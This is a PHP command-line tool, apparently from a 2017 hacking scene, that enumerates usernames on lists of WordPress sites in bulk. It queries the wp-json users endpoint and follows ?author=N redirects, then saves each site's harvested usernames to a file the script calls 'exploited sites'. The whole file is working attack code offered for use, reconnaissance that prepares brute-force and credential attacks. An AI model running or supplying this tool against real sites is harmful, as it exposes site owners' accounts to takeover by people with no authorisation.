#!/usr/bin/php
<?php

/*
    Mass Enumerate User Wordpress
    Coder: v4p0r
    Date: 15 NOV 2017 - 21:13
    Image: http://prntscr.com/hazjod
    Greetz:  YC - HighTech - EOF Club - Brian - d3m0l1d0r - Cater - Strike - rCent
    Kodo - CrazyDuck - xin0x - MMxM - CriptonKing - b33ck - d3z3n0v3 - c0de_universal - All Friends
*/

error_reporting(0);

function banner(){
    
echo <<<END
              (O)
              <M
   o          <M  MASS GET WP USER!!!
  /| ......  /:M\------------------------------------------------,,,,,,
(O)[]XXXXXX[]I:K+}=====<{H}>================================------------>
  \| ^^^^^^  \:W/------------------------------------------------''''''
   o          <W   Eh..... a vida da voltas 
              <W     A minha voltou pra tras
              (O)        cZd 2k 17    
              
END;
    
    $scrip_name = basename($_SERVER['SCRIPT_NAME']);
    
    echo "\nUsage: " . $scrip_name . " [comando]\n" .
          "\n[+] Comandos:\n\n".
          "-l  [seleciona sua lista de wordpress]\n" .
          "-u  [quantidade de possiveis users]\n" .
          "-s  [onde os sites exploitados serao salvos]\n\n" .
          "[!] Exemplos:\n\n" .
          "php " . $scrip_name . " -l <list> -u <nmr de users> -s <save>\n" .
          "php " . $scrip_name . " -l list.txt -u 5 -s user_saves.txt\n";
    exit(0);

}
 
$opt = getopt("l:u:s:");

if(!($opt['l']) || !($opt['u']) || !($opt['s']))
    banner();

function get_info($get_target, $url_filter) {
    
    global $opt;

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $get_target);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $a = curl_exec($ch);
    curl_close($ch); 

    $get_headers = explode("\n", $a);
    $get_redir = $url;
    $count = count($get_headers);

    for($i = 0; $i < $count; $i++) {
        if(strpos($get_headers[$i], "Location:") !== false) {
            $get_redir = trim(str_replace("Location:", "", $get_headers[$i]));
            break;
        }
    }

    if(preg_match('/author\/(.*?)\//', $get_redir)) {
        $get_regex = '/author\/(.*?)\//';
        $get_url = $get_redir;
        preg_match($get_regex, $get_url, $get_user);
        $user_found = $get_user[1];
        if(empty($user_found)) {
            echo "\n[-] We did not find any user";
        } else {
            echo "\n[+] User Found: " . $user_found . "\n";
            $save = fopen($opt['s'], "a");
            fwrite($save, "-----------------------------\r\n[*] Site: $url_filter\r\n[*] User: $user_found\r\n");
            fclose($save);    
        }
    } else {
        echo "\n[-] We did not find any user"; 
    }

}

# PoC: https://packetstormsecurity.com/files/140368/wpstopuserenumeration-enumerate.txt
function wp_json($url_filter) {

    global $opt;

    $get_payload = "$url_filter/wp-json/wp/v2/users";
    $get_decode = @file_get_contents($get_payload);
    $get_json = json_decode($get_decode, true);
    
    echo "[!] ====== GET USERS WP-JSON ====== [!]\n\n";
    
    if($get_json) {
        foreach($get_json as $get_user) {
            $get_id = $get_user['id'];
            $get_name = $get_user['name'];
            $mec_user = $get_user['slug'];
                
            echo "[+] ID: " . $get_id . "\n";
            echo "[+] Username: " . $get_name . "\n";
            echo "[+] User: " . $mec_user . "\n";
            echo "\n";
            
            $save = fopen($opt['s'], "a");
            fwrite($save, "-----------------------------\r\n[*] Site: $url_filter\r\n[*] ID: $get_id\r\n[*] Username: $get_name\r\n[*] User: $mec_user\r\n");
            fclose($save);            
        }    
            
    } else {
        echo "[-] No user found\n\n";
    }

}

echo "\n+======================+\n" .
     " # Mass GET WP User    +\n" .
     " # Coder: v4p0r        +\n" .
     " # Twiiter: 0x777null  +\n" .
     "+======================+\n\n"; 

$list_filter = array_filter(explode("\r\n", file_get_contents($opt['l'])));

echo "\n[*] Total Sites : " . count($list_filter);
$filer_one_users = $opt['u'];
echo "\n[*] Users counts : " . $filer_one_users;

foreach($list_filter as $url_filter) {

    global $opt;
    $payload = "/?author=";
    $url_ = "$url_filter$payload";

    $get_pages = 1; 

    echo "\n\n[!] Test Site: " . $url_filter . "\n\n";
    echo wp_json($url_filter);

    echo "[!] ====== GET USERS BY WP BYPASS ====== [!]\n\n";
    
    while($get_pages <= $filer_one_users) {
        $get_target = $url_ . $get_pages;
        echo get_info($get_target, $url_filter);
        $get_pages++;
    }
    
    echo "\n[!] ====== FINSH ====== [!]\n";

} 

?>